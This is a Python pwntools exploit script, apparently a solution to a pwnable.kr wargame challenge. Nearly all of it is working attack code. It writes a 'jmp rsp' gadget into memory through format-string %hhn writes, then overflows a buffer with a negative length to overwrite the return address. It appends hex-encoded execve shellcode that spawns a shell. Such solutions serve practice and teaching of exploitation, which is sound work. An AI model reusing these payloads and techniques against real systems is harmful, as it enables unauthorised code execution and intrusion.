#!/usr/bin/python
#
# This is version exploits string format and buffer overflow vulnerability
#
from pwn import *

# e.g. format_addr(0xdeadbeef01234567) = 36373435323330316566626561646465
def format_addr(a):                                               
    l = list('{:016x}'.format(a))
    l[1::2], l[::2]  = l[::2], l[1::2]
    l = l[::-1]
    o = [hex(ord(c))[2:] for c in l]
    return ''.join(o)

def set_key():
    t.sendline('1')
    t.sendline('17')
    t.sendline('19')
    t.sendline('13')
    t.sendline('133')

def fsb_write(what, where):
    payload = '%{:03d}c%78$hhn    {}'.format(what, p64(where)) 
    
    # encrypt vulnerable format string
    t.sendline('2')
    t.sendline(str(len(payload)))
    t.sendline(payload)
    t.readuntil('-encrypted result (hex encoded) -\n')
    hex_encoded = t.readline()
    
    # decrypt and print vulnerable format string
    t.sendline('3')                                  
    t.sendline(str(len(hex_encoded)))                
    t.sendline(hex_encoded)                          

def bo_jump(dest):
    junk      = 'A' * 32 
    ret_addr  = format_addr(dest)
    shellcode =                           \
        format_addr(0xfe58426a40EC8348) + \
        format_addr(0x622fbf48529948c4) + \
        format_addr(0x545768732f2f6e69) + \
        format_addr(0x0fd28949d089495e) + \
        format_addr(0x0000000000000005)

    # override return address with destination and put shellcode right after it
    hex_encoded = (junk + junk + junk + ret_addr + shellcode).ljust(576 * 2, 'A')
    t.sendline('3')
    t.sendline('-1') #  overflow
    t.sendline(hex_encoded)


t = remote('pwnable.kr', 9012)

# set valid key pair
set_key()

# destination - two free bytes (in alignment) in RWX .bss
jump_rsp_addr = 0x6020A4

# write 0xff 0xe4 (`jump rsp`) to destination
fsb_write(0xff, jump_rsp_addr)
fsb_write(0xe4, jump_rsp_addr + 1)

# jump to destination and execute `jump rsp`
bo_jump(jump_rsp_addr)

t.interactive()
